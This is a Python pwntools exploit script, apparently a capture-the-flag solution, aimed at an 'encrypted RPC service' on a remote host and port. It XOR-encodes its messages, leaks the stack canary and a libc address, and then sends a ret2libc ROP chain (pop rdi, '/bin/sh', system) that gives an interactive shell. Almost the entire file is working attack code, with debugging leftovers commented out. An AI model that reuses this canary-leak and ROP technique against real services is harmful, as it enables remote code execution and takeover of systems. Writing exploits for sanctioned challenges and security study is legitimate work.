#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from random import randrange, seed
import array
import numpy as np
import os
from enum import Enum

class Type(Enum):
	READ_T = 0
	WRITE_T = 1
	APPEND_T = 2
	END_T = 3

MAX_SIZE = 0x100
WELCOME = 'Welcome to encrypted RPC service!\n'
SEND = 'Send encrypted object:\n'
DATA = 'data: '

def make_obj(type, size = 0, data = b'-' * MAX_SIZE):
	return p32(type.value) + p32(size) + data

def make_read(size = MAX_SIZE, data = b'r' * (MAX_SIZE - 1) + b'\x00'):
	return make_obj(Type.READ_T, size, data)

def make_write():
	return make_obj(Type.WRITE_T)

def make_append(size = MAX_SIZE, data = b'a' * MAX_SIZE):
	return make_obj(Type.APPEND_T, size, data)

def make_end():
	return make_obj(Type.END_T)

def make_data(offset):
	data = make_read()
	data += make_append(offset)
	data += make_write()
	return data

def memfrob(s):
	return (np.frombuffer(s, dtype=np.uint8) ^ 42).tobytes()

def connect_remote():
	return remote('h4x.0x04.net', 1337)

def connect_test():
	cmd = 'gcc -fstack-protector test.c -o test'
	os.system(cmd)
	return process("./test", aslr = False)

def connect_target():
	return process("./target")#, env={"LD_PRELOAD": "libc.so.6"})

def connect_glibc():
	return process("./bskglibc", env={"LD_LIBRARY_PATH": "."})	

def send(r, msg):
	r.send(memfrob(msg))

def finish(r):
	send(r, make_end())
	#send(r, make_write())
	r.interactive()

def get_canary(r):
	offset = 10
	msg = make_data(offset)
	send(r, msg)
	r.recvn(len(WELCOME + 3 * SEND + DATA) + MAX_SIZE - 1)
	r.recvn(offset)
	canary = b"\x00" + r.recvn(7)
	info("canary: 0x{:016x}".format(u64(canary)))
	r.clean()
	return canary

'''
def get_stack(r):
	offset = 3 + 31
	msg = make_data(offset)
	send(r, msg)
	r.recvn(len(2 * SEND + DATA) + MAX_SIZE  + 25 + 31)
	stack = u64(r.recvn(6) + b"\x00\x00")
	stack -= 0x128
	info("stack: 0x{:016x}".format(stack))
	r.clean()
	return stack
'''

def get_libc(r):
	libc = 0x00

	offset = 41#57#18
	msg = make_data(offset)
	send(r, msg)

	
	r.recvn(len(2 * SEND + DATA) + MAX_SIZE - 1)
	r.recvn(offset)
	libc = u64(r.recvn(6) + b"\x00\x00")
	#libc -= 0x21b97
	#libc -= 0x22A1A3
	#libc -= 0x82095A0 #18
	#libc -= 0x82095a8 #57


	'''
	MOJ 00000000000270b0 <__libc_start_main>:
	'''
	#libc -= 0x270b0
	
	'''
	ICH 0000000000021ab0 __libc_start_main@@GLIBC_2.2.5
	'''
	libc -= 0x21ab0


	libc -= 0xf3


	libc += 0xC

	#libc -= 0x271a3 #41 - 0x9f4
	#libc -= 0x9f60c


	#libc -= 0x5600 #41 - remote
	#libc += 0x060c

	info("libc: 0x{:016x}".format(libc))
	r.clean()
	
	return libc

def get_shellcode_remote(libc = 0x00007ffff79e4000):
	POP_RDI = 0x2155f
	SYSTEM = 0x4f440
	BIN_SH = 0x1b3e9a
	RET = POP_RDI + 1

	msg = p64(libc + RET)
	info("RET: 0x{:016x}".format(libc + RET))
	msg += p64(libc + POP_RDI)
	info("POP_RDI: 0x{:016x}".format(libc + POP_RDI))
	msg += p64(libc + BIN_SH)
	info("BIN_SH: 0x{:016x}".format(libc + BIN_SH))
	msg += p64(libc + SYSTEM)
	info("SYSTEM: 0x{:016x}".format(libc + SYSTEM))

	return msg

def get_shellcode_local(libc = 0x00007ffff7bf2000 + 0x203000):
	info("libc (true): 0x{:016x}".format(libc))

	POP_RDI = 0x26b62 #0x0000000000026b62 
	SYSTEM = 0x499E0
	BIN_SH = 0x18d1ac #SIGSEGV
	RET = POP_RDI + 1

	msg = p64(libc + RET)
	info("RET: 0x{:016x}".format(libc + RET))
	msg += p64(libc + POP_RDI)
	info("POP_RDI: 0x{:016x}".format(libc + POP_RDI))
	msg += p64(libc + BIN_SH)
	info("BIN_SH: 0x{:016x}".format(libc + BIN_SH))
	msg += p64(libc + SYSTEM)
	info("SYSTEM: 0x{:016x}".format(libc + SYSTEM))

	return msg

def exploit(r, canary, shellcode):
	msg = make_read()
	data = b'b' * 9
	data += canary
	data += b'\x00' * 24
	data += shellcode
	msg += make_append(len(data), data.ljust(MAX_SIZE, b'e'))
	msg += make_write()
	send(r, msg)

def main():
	r = connect_remote()
	#r = connect_test()
	#r = connect_target()
	#r = connect_glibc()
	canary = get_canary(r)
	#stack = get_stack(r)

	shellcode = get_shellcode_remote(get_libc(r))
	#shellcode = get_shellcode_local(get_libc(r))
	#shellcode = get_shellcode_remote()

	#libc = get_libc(r)
	#shellcode = get_shellcode_local()
	
	#gdb.attach(r, gdbscript = "p &system")
	exploit(r, canary, shellcode)

	#gdb.attach(r)
	#sleep(0.3)

	#check_canary(r, canary)
	
	
	#gdb.attach(r,  gdbscript = "display/10i $pc\nb *0")
	finish(r)

if __name__ == '__main__':
	main()
